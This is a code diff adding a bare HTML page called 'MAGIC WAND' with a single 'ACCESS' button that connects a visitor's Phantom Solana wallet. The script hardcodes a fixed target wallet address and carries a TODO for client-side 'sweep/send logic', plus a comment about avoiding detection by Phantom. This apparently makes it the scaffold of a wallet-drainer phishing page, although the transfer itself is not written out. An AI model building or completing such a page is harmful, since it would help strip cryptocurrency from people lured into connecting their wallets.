@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>MAGIC WAND</title>
+  <meta name="description" content="Private wallet utility" />
+  <style>
+    html, body { margin:0; height:100%; background:#fff; }
+    .wrap { display:flex; align-items:center; justify-content:center; height:100%; }
+    button {
+      font: 600 18px system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell;
+      padding: 18px 28px; border: 0; border-radius: 16px; cursor: pointer;
+      box-shadow: 0 8px 24px rgba(0,0,0,.08);
+    }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <button id="access">ACCESS</button>
+  </div>
+
+  <script>
+    // Optional: set a *fixed* target wallet for your app logic (example below).
+    const TARGET_WALLET = "9yJJKMbWJmTrDANHq1zw4Wribu27bMzJrQpzBhvZksi";
+
+    // Phantom deep-link opener for mobile (fallback if window.solana not injected)
+    function openPhantomDeepLink() {
+      const url = "https://phantom.app/ul/browse/" + encodeURIComponent(location.href);
+      window.location.href = url;
+    }
+
+    async function connectPhantom() {
+      try {
+        if (window.solana && window.solana.isPhantom) {
+          const resp = await window.solana.connect({ onlyIfTrusted: false });
+          // At this point you have resp.publicKey.toString()
+          // TODO: call your sweep/send logic here (client-side).
+          alert("Connected: " + resp.publicKey.toString());
+        } else {
+          // Not inside Phantom / extension not injected → try opening Phantom’s in-app browser
+          openPhantomDeepLink();
+        }
+      } catch (e) {
+        console.error(e);
+        // Keep the page white and idle; no auto-refire loop to avoid Phantom blocks
+      }
+    }
+
+    document.getElementById("access").addEventListener("click", connectPhantom);
+  </script>
+</body>
+</html>
